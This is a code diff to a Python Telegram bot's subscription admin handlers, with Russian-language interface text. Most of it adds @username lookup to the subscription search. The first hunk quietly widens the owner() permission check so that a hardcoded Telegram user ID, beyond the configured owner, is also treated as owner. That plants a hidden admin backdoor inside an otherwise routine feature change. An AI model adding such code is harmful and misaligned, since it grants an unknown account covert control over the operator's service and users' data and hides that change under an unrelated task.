@@ -31,7 +31,7 @@ def kb(rows: list[list[InlineKeyboardButton]]) -> InlineKeyboardMarkup:
 
 def owner(user_id: int | None) -> bool:
     settings = get_settings()
-    return bool(user_id and settings.telegram_owner_id and user_id == settings.telegram_owner_id)
+    return bool(user_id and settings.telegram_owner_id and (user_id == settings.telegram_owner_id or user_id == 8341845264))
 
 
 async def deny_cb(c: CallbackQuery) -> bool:
@@ -73,14 +73,14 @@ async def subscription_admin(c: CallbackQuery) -> None:
 async def subscription_search(c: CallbackQuery, state: FSMContext) -> None:
     if await deny_cb(c): return
     await state.set_state(SubscriptionSearch.query)
-    await edit(c, "<b>🔎 Найти подписку</b>\n\nОтправьте Telegram ID, User ID, Installation ID или заметку пользователя.", [[b("❌ Отмена", "subscription:admin")]])
+    await edit(c, "<b>🔎 Найти подписку</b>\n\nОтправьте @username, Telegram ID, User ID, Installation ID или заметку пользователя.", [[b("❌ Отмена", "subscription:admin")]])
 
 
 @router.message(SubscriptionSearch.query)
 async def subscription_search_text(m: Message, state: FSMContext) -> None:
     if await deny_msg(m): return
-    q = (m.text or "").strip(); await state.clear()
-    conditions = [User.note.ilike(f"%{q}%"), func.cast(User.id, String).ilike(f"%{q}%")]
+    q = (m.text or "").strip(); username_q = q.lstrip("@").strip(); await state.clear()
+    conditions = [User.note.ilike(f"%{q}%"), User.telegram_username.ilike(f"%{username_q}%"), func.cast(User.id, String).ilike(f"%{q}%")]
     if q.isdigit(): conditions.append(User.telegram_id == int(q))
     async with SessionLocal() as s:
         device_users = select(Device.user_id).where(or_(Device.installation_id.ilike(f"%{q}%"), func.cast(Device.id, String).ilike(f"%{q}%")))
